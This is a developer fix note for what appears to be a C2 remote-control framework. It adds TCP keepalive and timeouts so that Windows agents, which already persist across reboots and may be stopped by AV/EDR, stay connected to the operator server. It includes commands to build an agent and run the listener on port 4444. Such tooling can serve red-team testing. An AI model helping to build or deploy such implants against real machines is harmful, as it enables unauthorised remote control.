# Fix: Immediate Connection Disconnection Issue

##  Problem

Users reported that agents would connect successfully but disconnect immediately after:

```
? Nuevo cliente [1] desde IP:PORT
? Cliente [1] desconectado
```

This was occurring even when:
- The persistence mechanism was working correctly
- The agent was starting automatically after reboot
- The initial connection was being established

##  Root Cause

The TCP connections were not configured with proper keepalive and timeout settings. This caused:

1. **No TCP Keepalive**: Routers and firewalls would close "idle" connections, even when the agent was waiting for commands
2. **No Timeout Configuration**: Connections could hang indefinitely on network issues
3. **NAT Traversal Issues**: Without keepalive packets, NAT mappings would expire, causing the connection to fail

This is especially problematic for:
- Agents behind residential NAT/routers
- Connections through multiple firewalls
- Long-idle periods between commands

##  Solution Implemented

### 1. TCP Keepalive Configuration

Added `configure_tcp_keepalive()` function that:
- Enables TCP keepalive on the socket
- Uses Windows-specific socket options for better control
- Sends periodic keepalive packets to maintain the connection

```rust
fn configure_tcp_keepalive(stream: &TcpStream) -> std::io::Result<()> {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::io::AsRawSocket;
        use winapi::um::winsock2::{setsockopt, SOL_SOCKET, SO_KEEPALIVE};

        unsafe {
            let socket = stream.as_raw_socket() as SOCKET;
            let keepalive: u32 = 1; // Enable keepalive
            setsockopt(socket, SOL_SOCKET, SO_KEEPALIVE, ...);
        }
    }
    Ok(())
}
```

### 2. Read/Write Timeouts

Added reasonable timeout values to prevent indefinite hangs:
- **Read timeout**: 5 minutes (300 seconds) - long enough to wait for commands
- **Write timeout**: 30 seconds - quick enough to detect network issues

```rust
stream.set_read_timeout(Some(Duration::from_secs(300)))?;
stream.set_write_timeout(Some(Duration::from_secs(30)))?;
```

### 3. Graceful Error Handling

Configuration failures are logged but don't prevent connection:
```rust
if let Err(e) = configure_tcp_keepalive(&stream) {
    debug_print!("DEBUG: Warning - No se pudo configurar TCP keepalive: {}", e);
}
```

##  How This Fixes the Issue

### Before:
```
Agent connects → No keepalive configured → NAT timeout after 60s → Connection dies
```

### After:
```
Agent connects → Keepalive enabled → Periodic keepalive packets → Connection stays alive
                 ↓
              Timeouts configured → Network issues detected quickly → Proper reconnection
```

##  Technical Details

### TCP Keepalive Benefits

1. **Prevents NAT Timeout**: Keepalive packets keep NAT mappings active
2. **Detects Connection Loss**: Failed keepalive indicates connection is dead
3. **Maintains Firewall State**: Many firewalls track "live" connections via activity

### Timeout Benefits

1. **Read Timeout (5 min)**:
   - Allows agent to wait for commands without timing out prematurely
   - Detects server-side issues (server crash, network partition)

2. **Write Timeout (30 sec)**:
   - Quickly detects network write failures
   - Prevents indefinite blocking on send operations

##  Testing

To verify the fix works:

1. **Build with the fix:**
   ```bash
   cd builder
   cargo run --release -- build-agent --server "IP:4444" --name fixed-agent
   ```

2. **Deploy to test machine**

3. **Monitor server logs:**
   ```bash
   ./c2r2-server --bind 0.0.0.0 --port 4444 --verbose
   ```

4. **Expected behavior:**
   - Agent connects and stays connected
   - No immediate disconnection
   - Connection survives idle periods
   - Proper reconnection if network temporarily fails

##  Changes Made

**Files Modified:**
- `agent/src/main.rs`:
  - Added `configure_tcp_keepalive()` function
  - Added timeout configuration in connection setup
  - Added error handling for configuration failures

- `agent/Cargo.toml`:
  - Added `winsock2` and `ws2def` to winapi features for socket configuration

##  Expected Results

After this fix:
-  Connections stay alive for extended periods
-  NAT/firewall traversal improved
-  Quick detection and recovery from network issues
-  No more immediate disconnections on idle connections

##  Troubleshooting

If issues persist after this fix:

1. **Check firewall rules** - Ensure TCP port is allowed in both directions
2. **Verify NAT configuration** - Port forwarding must be correct
3. **Check AV/EDR** - May be killing the process (use non-production build for testing)
4. **Monitor network** - Use Wireshark to see if keepalive packets are being sent

---

**Version:** 2.0.2
**Date:** November 2024
**Related to:** Persistence Fix PR
